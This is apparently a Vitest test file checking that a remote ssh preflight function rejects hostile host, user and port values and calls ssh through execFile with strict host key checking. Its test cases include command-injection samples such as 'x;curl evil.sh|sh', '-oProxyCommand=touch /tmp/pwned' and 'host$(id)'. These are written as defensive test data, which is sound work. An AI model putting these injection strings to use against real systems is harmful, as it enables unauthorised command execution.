import { beforeEach, describe, expect, it, vi } from 'vitest'

// R2 P-1 (core-n-z #1): /preflight <host> must never build a shell string.
// ssh runs via execFile with argv, host/user/port are validated and unknown
// host keys are not silently accepted.

const childProcess = vi.hoisted(() => ({
    execSync: vi.fn(() => { throw new Error('execSync must not run for remote preflight') }),
    execFileSync: vi.fn(() => 'xaventra'),
}))
vi.mock('child_process', async importOriginal => ({
    ...(await importOriginal<any>()),
    execSync: childProcess.execSync,
    execFileSync: childProcess.execFileSync,
}))

import { runRemotePreFlight, validateSshTarget } from './preflight-checks.js'

beforeEach(() => {
    childProcess.execSync.mockClear()
    childProcess.execFileSync.mockClear()
})

describe('remote preflight (R2 P-1)', () => {
    it.each([
        'x;curl evil.sh|sh',
        'x & calc',
        '-oProxyCommand=touch /tmp/pwned',
        'host$(id)',
        'a b',
        '',
    ])('rejects host %j without running anything', async host => {
        const result = await runRemotePreFlight(host)
        expect(result.failed).toBe(1)
        expect(result.checks[0].message).toContain('abgelehnt')
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.execFileSync).not.toHaveBeenCalled()
    })

    it('rejects a hostile user or port', async () => {
        await runRemotePreFlight('spark', 'x;id')
        await runRemotePreFlight('spark', 'xaventra', 0)
        await runRemotePreFlight('spark', 'xaventra', Number.NaN)
        expect(childProcess.execFileSync).not.toHaveBeenCalled()
        expect(validateSshTarget('10.0.0.5', 'xaventra', 22)).toBeNull()
        expect(validateSshTarget('spark.tail1234.ts.net', 'tgbrutus', 2222)).toBeNull()
    })

    it('calls ssh with argv, strict host keys and no local shell', async () => {
        await runRemotePreFlight('100.86.70.71', 'xaventra', 22)
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.execFileSync).toHaveBeenCalled()
        const [file, argv] = childProcess.execFileSync.mock.calls[0] as unknown as [string, string[]]
        expect(file).toBe('ssh')
        expect(Array.isArray(argv)).toBe(true)
        expect(argv).toContain('StrictHostKeyChecking=yes')
        expect(argv.join(' ')).not.toContain('accept-new')
        expect(argv.slice(-2)).toEqual(['100.86.70.71', 'whoami'])
        expect(argv[argv.length - 3]).toBe('--')
    })
})
